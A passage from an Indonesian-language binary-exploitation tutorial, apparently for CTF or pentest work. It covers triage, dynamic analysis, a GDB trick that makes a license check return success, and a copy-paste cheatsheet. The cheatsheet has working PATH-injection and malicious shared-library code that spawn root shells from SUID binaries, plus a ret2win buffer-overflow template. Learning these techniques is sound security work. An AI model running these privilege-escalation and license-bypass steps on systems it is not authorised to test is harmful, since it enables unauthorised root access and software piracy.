(gdb) run
(gdb) # Saat berhenti di check_license, set return value
(gdb) set $rax = 1    # Return 1 (success)
(gdb) continue
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`Segmentation fault`|Memory access invalid|GDB → info registers → backtrace|
|`strace: Operation not permitted`|ptrace diblokir|`sudo strace` atau cek Yama scope|
|`ltrace: command not found`|Tool tidak terinstall|`sudo apt install ltrace`|
|`ltrace: no output`|Static binary atau anti-trace|Gunakan Ghidra + GDB|
|`gdb: cannot attach SUID`|Security restriction|Copy binary, hilangkan SUID, debug copy|
|`checksec: not found`|Tool missing|`pip3 install checksec.py` atau `apt install checksec`|
|`Ghidra: analysis stuck`|Large binary|Tunggu atau batasi analyzer yang dipakai|
|`no symbols` dari nm|Stripped binary|Gunakan Ghidra auto-analysis untuk recover|
|`PATH injection gagal`|Binary reset PATH|Cek strace apakah binary hardcode PATH|
|`Library hijack gagal`|Nama tidak cocok|Cek exact name dari `ldd` output|
|`cyclic_find returns None`|RIP tidak diisi pattern|Coba input lebih panjang|
|`pwntools import error`|Wrong Python env|Buat venv: `python3 -m venv ~/pwn && source ~/pwn/bin/activate && pip install pwntools`|
|Binary crash immediately|Missing library atau arg|`ldd binary` dan `./binary --help`|

---

## ═══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ═══════════════════════════════════════

text

```
START: Binary ditemukan
│
├─ FASE 0: Triage (file, ls, checksec, strings, ldd)
│   ├─ SUID root binary → PrivEsc context, analisis PATH/library
│   ├─ Dangerous functions (gets/strcpy) → BOF candidate
│   ├─ Hardcoded password (dari strings) → ltrace konfirmasi
│   ├─ Missing library → Library hijacking
│   └─ "command" tanpa path → PATH injection candidate
│
├─ FASE 2: Dynamic Analysis
│   ├─ strace → execve("cmd") tanpa path → FASE 2A PATH Injection → ROOT
│   ├─ ltrace → strcmp(input, "password") → Password ditemukan → ACCESS
│   ├─ Input testing → crash → FASE 3 GDB
│   └─ Format string %x output → Format string vuln
│
├─ FASE 3: GDB
│   ├─ RIP = 0x4141... → BOF confirmed → Cari offset → FILE 49
│   ├─ Stack smashing detected → Canary present → Butuh leak → FILE 49 advanced
│   └─ win() function ada → ret2win pattern → FILE 49
│
└─ FASE 4: Ghidra
    ├─ strcmp hardcoded → Password → direct exploit
    ├─ system("cmd") tanpa path → PATH injection → Fase 2A
    ├─ gets()/strcpy() → BOF → FILE 49
    ├─ printf(user_input) → Format string → FILE 49
    └─ Hidden --admin argument → direct trigger
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === TRIAGE ===
BINARY="/path/to/binary"
file $BINARY && ls -la $BINARY
checksec --file=$BINARY
strings $BINARY | grep -Ei 'password|flag|secret|system|exec|gets|strcpy|bash|backup'
ldd $BINARY
objdump -T $BINARY | grep -E 'gets|strcpy|system|execve|strcmp|printf'

# === DYNAMIC ===
strace $BINARY 2>&1 | grep -E 'execve|openat|connect'
strace -e trace=execve $BINARY 2>&1     # Focus on process execution
ltrace $BINARY 2>&1                      # Library calls
ltrace -e strcmp $BINARY 2>&1            # Focus on string comparison
echo "test_pass" | ltrace $BINARY 2>&1  # Test with input

# === CRASH TESTING ===
for i in 50 100 200 300 500; do
    python3 -c "print('A'*$i)" | $BINARY 2>&1 | grep -q "Segmentation\|fault" && echo "CRASH at $i!"
done

# === GDB ===
gdb $BINARY
# (gdb) set disassembly-flavor intel
# (gdb) info functions
# (gdb) run <<< $(python3 -c "from pwn import cyclic; print(cyclic(300).decode())")
# (gdb) info registers rip

# === OFFSET FINDING ===
python3 -c "from pwn import cyclic; print(cyclic(300).decode())" > /tmp/pattern.txt
# Setelah crash di GDB: python3 -c "from pwn import cyclic_find; print(cyclic_find(0xVALUE))"

# === PATH INJECTION ===
cat > /tmp/COMMAND_NAME << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/COMMAND_NAME
export PATH=/tmp:$PATH
$BINARY

# === LIBRARY HIJACKING ===
cat > /tmp/malicious.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) static void inject(void) {
    setuid(0); setgid(0);
    system("/bin/bash -p");
}
EOF
gcc -shared -fPIC -o /tmp/LIBNAME.so /tmp/malicious.c
cp /tmp/LIBNAME.so /RPATH_DIR/
$BINARY

# === PWNTOOLS TEMPLATE ===
python3 << 'EOF'
from pwn import *
elf = ELF("./binary", checksec=False)
context.binary = elf
p = process(elf.path)
offset = 72          # Dari GDB
win = elf.symbols['win']
payload = b"A" * offset + p64(win)
p.sendline(payload)
p.interactive()
EOF
```

---

> **➡️ NEXT:**
> 
> - Jika ketemu **Buffer Overflow** → **`<a href="/docs/buffer-overflow" class="text-[#00b4d8] hover:underline font-mono font-semibold">49_buffer_overflow_workflow.md</a>`** untuk full exploit development (ret2win, ret2libc, ROP chains)
> - Jika butuh **ROP Chain** (NX enabled) → **`<a href="/docs/rop-chain" class="text-[#00b4d8] hover:underline font-mono font-semibold">50_rop_chain_workflow.md</a>`**
> - Jika binary sangat complex dan perlu deep RE → **`<a href="/docs/reverse-engineering" class="text-[#00b4d8] hover:underline font-mono font-semibold">51_reverse_engineering_workflow.md</a>`**
> - Jika ketemu **PATH injection** dari SUID binary → kembali ke **`<a href="/docs/sudo-suid-capabilities" class="text-[#00b4d8] hover:underline font-mono font-semibold">47_sudo_suid_capabilities_workflow.md</a>`** Fase 2.6A